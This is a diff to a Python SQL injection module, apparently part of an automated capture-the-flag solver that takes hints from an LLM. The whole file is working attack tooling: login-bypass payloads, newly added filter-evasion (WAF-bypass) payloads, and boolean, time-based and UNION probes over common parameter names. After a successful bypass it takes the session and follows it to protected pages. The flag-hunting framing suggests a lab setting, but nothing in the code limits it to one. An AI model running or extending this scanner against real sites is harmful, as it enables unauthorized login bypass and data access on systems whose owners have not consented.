@@ -1,10 +1,16 @@
-"""SQL 注入检测：登录绕过 + 参数注入（布尔/报错/时间盲注/UNION 探测）。"""
+"""SQL 注入检测：登录绕过 + 参数注入（布尔/报错/时间盲注/UNION 探测）。
+
+LLM 提示支持（ctx 字段）：
+  extra_form_paths  : LLM 发现的非标准登录路径
+  param_hints       : LLM 推荐优先测试的参数名
+  waf_hint          : WAF/过滤特征描述 → 自动切换 WAF 绕过 payload
+"""
 from __future__ import annotations
 
 from ..common import (Candidate, body_of, extract_flag, extract_session,
                       follow_session, get, post)
 
-# 登录表单注入载荷（' or '1'='1 -- 经典认证绕过）
+# 标准登录注入载荷
 LOGIN_PAYLOADS = [
     ("' or '1'='1' -- ", "x"),
     ("' or '1'='1'#", "x"),
@@ -12,21 +18,32 @@ LOGIN_PAYLOADS = [
     ("1' or '1'='1' -- ", "1"),
 ]
 
-# 参数注入探测对：(正常值, 注入值)。响应差异 → 可疑
+# WAF 绕过载荷：当 ctx["waf_hint"] 非空时优先使用
+# 双引号注入（绕过单引号过滤）、注释绕过、十六进制
+WAF_BYPASS_PAYLOADS = [
+    ('" or "1"="1" -- ', "x"),
+    ('a" or "b"="b', "x"),
+    ('1/**/or/**/1=1', "x"),
+    ('1 OR 1=1', "x"),
+    ('1%20OR%201=1', "x"),
+]
+
 PARAM_PAIRS = [
     ("1", "1'"),
     ("1", "1' AND '1'='1"),
-    ("1", "1' AND '1'='2"),
     ("1", "1 OR 1=1"),
     ("1", "1' OR '1'='1"),
     ("1", "1 UNION SELECT 1,2,3"),
-    ("1", "1\" OR \"1\"=\"1"),
+    ("1", '1" OR "1"="1'),
     ("1", "1' AND SLEEP(2) -- "),
 ]
 
-# 常见注入参数名
 PARAM_NAMES = ["id", "uid", "user_id", "order", "type", "cat", "cid", "pid",
                "page", "limit", "goods_id", "article_id", "file_id", "sid"]
+
+
+def _ordered_unique(items: list[str]) -> list[str]:
+    return list(dict.fromkeys(items))
 
 
 def run(ctx) -> list[Candidate]:
@@ -34,40 +51,56 @@ def run(ctx) -> list[Candidate]:
     base = ctx["base"].rstrip("/")
     out += _login_bypass(ctx, base)
 
-    # 从主页/已知路径收集 GET 参数（先试常见参数名在 / 和 /api 上）
+    # LLM 推荐参数优先，其次是内置参数名
+    param_hints = ctx.get("param_hints", [])
+    all_params = _ordered_unique(param_hints + PARAM_NAMES)
+
     for path in ("/", "/api", "/api/v1", "/list", "/index"):
         if ctx["time_left"]() <= 0:
             break
-        for pname in PARAM_NAMES:
+        for pname in all_params:
             if ctx["time_left"]() <= 0:
                 break
             cand = _probe_param(ctx, base, path, pname)
             if cand:
                 out.append(cand)
-                break  # 一个参数命中即可，继续下个路径
+                break
     return out
 
 
 def _login_bypass(ctx, base: str) -> list[Candidate]:
+    # LLM 发现的非标准登录路径优先
+    extra = ctx.get("extra_form_paths", [])
+    std_paths = ["/login", "/api/login", "/auth/login", "/user/login", "/signin"]
+    all_form_paths = _ordered_unique(extra + std_paths)
+
+    # 根据 WAF 提示选择载荷集
+    use_waf_bypass = bool(ctx.get("waf_hint"))
+    payloads = (WAF_BYPASS_PAYLOADS + LOGIN_PAYLOADS) if use_waf_bypass else LOGIN_PAYLOADS
+
     out: list[Candidate] = []
-    for form_path in ("/login", "/api/login", "/auth/login", "/user/login", "/signin"):
+    for form_path in all_form_paths:
         if ctx["time_left"]() <= 0:
             break
         resp = post(base + form_path, ctx["timeout"],
                     data={"user": "u", "pass": "p"})
-        if resp is None or resp.status_code not in (200, 401, 302):
+        if resp is None or resp.status_code not in (200, 401, 302, 403):
             continue
-        for user, pwd in LOGIN_PAYLOADS:
+
+        # 检测 WAF（即使 ctx 里没设置，自动识别并切换）
+        local_payloads = payloads
+        if resp.status_code == 403 and "waf" in body_of(resp).lower():
+            local_payloads = WAF_BYPASS_PAYLOADS + LOGIN_PAYLOADS
+
+        for user, pwd in local_payloads:
             r = post(base + form_path, ctx["timeout"],
                      data={"user": user, "pass": pwd})
             if r is None:
                 continue
             body = body_of(r)
             flag = extract_flag(body)
-            # 注入后从 401 变 200/302 → 认证绕过
-            if flag or (r.status_code in (200, 302) and resp.status_code == 401):
-                note = f"注入载荷 {user!r} 使 401→{r.status_code}"
-                # 漏洞链：提取会话 → 跟随访问管理页抓 flag
+            if flag or (r.status_code in (200, 302) and resp.status_code in (401, 403)):
+                note = f"注入载荷 {user!r} 使 {resp.status_code}→{r.status_code}"
                 session = extract_session(body)
                 if session:
                     followed = follow_session(base, session, ctx["timeout"])
@@ -96,7 +129,6 @@ def _login_bypass(ctx, base: str) -> list[Candidate]:
 
 
 def _probe_param(ctx, base: str, path: str, pname: str) -> Candidate | None:
-    """对单个参数做差异探测：正常 vs 单引号/恒真/恒假。"""
     r0 = get(base + path, ctx["timeout"], params={pname: "1"})
     if r0 is None:
         return None
@@ -118,9 +150,6 @@ def _probe_param(ctx, base: str, path: str, pname: str) -> Candidate | None:
                 confidence=0.95, value=flag,
                 confirm={"note": "注入载荷直接命中 flag"},
             )
-        # 布尔差异：恒真 vs 恒假 响应不同（且与基线不同）→ 疑似注入
-        if payload == "1' AND '1'='2":
-            continue  # 由恒真/恒假对判断
         if probe == "1' AND '1'='1" and body == b0:
             r_false = get(base + path, ctx["timeout"], params={pname: "1' AND '1'='2"})
             if r_false is not None and body_of(r_false) != body and body != "":
@@ -133,3 +162,4 @@ def _probe_param(ctx, base: str, path: str, pname: str) -> Candidate | None:
                     confirm={"note": "恒真与恒假响应存在差异"},
                 )
     return None
+
